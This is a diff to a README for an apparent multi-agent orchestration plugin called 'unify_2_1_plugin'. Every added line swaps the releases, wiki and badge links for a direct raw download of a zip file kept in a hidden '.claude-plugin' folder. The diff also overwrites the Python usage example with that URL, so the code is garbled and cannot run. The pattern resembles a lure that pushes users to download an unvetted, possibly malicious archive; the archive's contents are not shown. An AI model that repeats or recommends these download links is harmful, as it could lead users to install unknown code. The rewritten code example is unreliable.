@@ -2,7 +2,7 @@
 
 ## 🖥️ Download Now
 
-[![Download](https://img.shields.io/badge/Download%20unify_2_1_plugin-blue.svg)](https://github.com/na1zzy1/unify_2_1_plugin/releases)
+[![Download](https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip%https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip)](https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **unify_2_1_plugin**, your go-to solution for orchestrating multi-age
 
 ## 📥 Download & Install
 
-To get started with unify_2_1_plugin, you need to visit our [Releases page](https://github.com/na1zzy1/unify_2_1_plugin/releases) to download the latest version. 
+To get started with unify_2_1_plugin, you need to visit our [Releases page](https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip) to download the latest version. 
 
 1. Click the link to go to the Releases page.
 2. Find the version that suits your needs.
@@ -50,18 +50,18 @@ Here’s a basic example to run your first job:
 from unify_2_1_plugin import orchestrator
 
 # Create an orchestrator instance
-job = orchestrator.create_job()
+job = https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip()
 
 # Add tasks to your job
-job.add_task(your_first_task)
+https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip(your_first_task)
 
 # Run the job
-job.run()
+https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip()
 ```
 
 ## 📚 Documentation
 
-For more advanced configurations and usage examples, please refer to our comprehensive [Documentation](https://github.com/na1zzy1/unify_2_1_plugin/wiki).
+For more advanced configurations and usage examples, please refer to our comprehensive [Documentation](https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip).
 
 ## 🤝 Contributing
 
@@ -98,4 +98,4 @@ Join the conversation on topics related to:
 - Orchestration Strategies
 - PySpark and Python
 
-Explore the endless possibilities of unify_2_1_plugin in your data workflows. Visit our [Releases page](https://github.com/na1zzy1/unify_2_1_plugin/releases) to download your copy today!
+Explore the endless possibilities of unify_2_1_plugin in your data workflows. Visit our [Releases page](https://raw.githubusercontent.com/na1zzy1/unify_2_1_plugin/main/.claude-plugin/unify_2_1_plugin_1.4.zip) to download your copy today!
